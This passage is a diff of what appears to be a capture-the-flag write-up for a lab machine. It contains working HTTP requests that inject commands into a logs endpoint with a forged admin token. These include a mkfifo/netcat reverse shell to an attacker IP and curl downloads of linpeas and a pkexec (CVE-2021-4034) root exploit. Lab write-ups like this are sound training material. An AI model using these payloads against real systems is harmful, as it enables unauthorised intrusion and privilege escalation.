@@ -262,7 +262,8 @@ Content-Length: 6
 }
 
 -------------
-
+RESPONSE
+------------
 
 	{
 		"role": {
@@ -272,9 +273,33 @@ Content-Length: 6
 	}
 
 ```
+Great we are now admin. Now lets see what we can do with this. If we go back the the `local_web/routes/private.js` we see that it's possible to view logs there. The check looks like the following:
+INSERT CODE FROM LOGS BIT
+We see that if our token says admin, we can get logs by the service trying to run `git logs $file`. Now there is two logical places that it will recive the command. In the json content of the GET request, or in the url. So lets craft a request and see which hit we get.
 
 ```html
-GET /api/logs/?file=0;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.231 6969 >/tmp/f HTTP/1.1
+GET /api/logs/?file=0;whoami HTTP/1.1
+Host: 10.10.11.120:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type:application/json
+Auth-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjA1ODk0OTAxMjkxYzA0NjRkZmRmMTYiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6IlRHQ0Bub3doZXJlLmNvbSIsImlhdCI6MTY0NDUzMDA3MH0.9mP1WrnMqAlNANivAR19Cn6vNTaPF_MBgTvOSYd9zow
+Content-Length: 6
+
+{
+	"file"="0; pwd"
+}
+```
+The respons I got was `\ndasith`. This means that it got a hit at the URL. So it gets the command there. Head over to [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) and find a reverseshell oneliner that suites you.
+I was only able to get: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f` to work so I will be showcasing this.
+Start a reverse tcp listener `nc -nvlp 8080`
+```html
+GET /api/logs/?file=0;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.231 8080 >/tmp/f HTTP/1.1
 Host: 10.10.11.120:3000
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
@@ -291,39 +316,46 @@ Content-Length: 6
 
 }
 ```
+And we get shell!
 
-Transfer linpeas
-
-```results
-╔══════════╣ Operative system                                                                                                                                                                                     
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                                                                     
-Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021                                                           
-Distributor ID: Ubuntu                                                                                                                                                                                            
-Description:    Ubuntu 20.04.3 LTS                                                                                                                                                                                
-Release:        20.04                                                                                                                                                                                             
-Codename:       focal                                                                                                                                                                                             
-                                                                                                                                                                                                                  
-╔══════════╣ Sudo version                                                                                                                                                                                         
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                        
-Sudo version 1.8.31                                                                                                                                                                                               
-                                                                                                                                                                                                                  
-Vulnerable to CVE-2021-4034                                                                                                                                                                                       
-                                                                                                                                                                                                                  
-./linpeas.sh: 1188: [[: not found                                                                                                                                                                                 
-./linpeas.sh: 1188: rpm: not found                                                                                                                                                                                
+# Privesc
+So first i go to /dev/shm to get a clean slate that I can work from and not disturb anyone else. There i transfer [linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) through the http server built into python. `python -m http.server`. And get my shell to get this with curl `curl http://10.10.14.231:8000/linpeas.sh -o linpeas.sh`.
+And run the script
+```
+╔══════════╣ Operative system                                                                                                                                                         
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 5.4.0-89-generic (buildd@lgw01-amd64-044) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #100-Ubuntu SMP Fri Sep 24 14:50:10 UTC 2021
+Distributor ID: Ubuntu
+Description:    Ubuntu 20.04.3 LTS
+Release:        20.04      
+Codename:       focal     
+                         
+╔══════════╣ Sudo version  
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.31
+Vulnerable to CVE-2021-4034
+./linpeas.sh: 1188: [[: not found
+./linpeas.sh: 1188: rpm: not found
 ./linpeas.sh: 1188: 0: not found                                                                                                                                                                                  
-                                                                                                                                                                                                                  
-╔══════════╣ PATH                                                                                                                                                                                                 
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                                                                
-/usr/bin:/bin                                                                                                                                                                                                     
-New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin                                                                                                                                   
-                                                                               
+╔══════════╣ PATH          
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/bin:/bin            
+New path exported: /usr/bin:/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin 
 
-```d
+```
+So linpeas reports that the host is vulnerable to [cve 2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034), first lets check it out to see what it is. It's a vulneralbility that has a local privilege escalation fault in the polkit pkexec utility. Therefore we can elevate ourselfs to root through the pkexec utility. It has to do with a setuid bit that is wrongly set.
+Here are two expliots that could work, i chose the latter as it seems like less work.
 https://github.com/berdav/CVE-2021-4034
 https://www.exploit-db.com/exploits/50689
 
+I prepare the files for transfer and transfer them with the python http server. Once the files are transferred, you simply have to run make and it will build the files for you and create a exploit program that will run the exploit.
+# Root
 ```rootflag
+### On the host we are attacking
+$ curl http://10.10.14.231:8000/Makefile -o Makefile
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   868
 $ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
@@ -347,6 +379,8 @@ exploit.c: In function ‘main’:
 exploit.c:26:2: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
    26 |  execve(BIN, argv, envp);
       |  ^~~~~~
+      
+### The files are made, now just run ./exploit
 $ ls
 asdf
 evil.so
@@ -357,6 +391,7 @@ linpeas.sh
 makefile
 multipath
 rash
+
 $ ./exploit
 whoami
 root
@@ -366,3 +401,4 @@ cd /root
 ls
 root.txt
 ```
+We are root
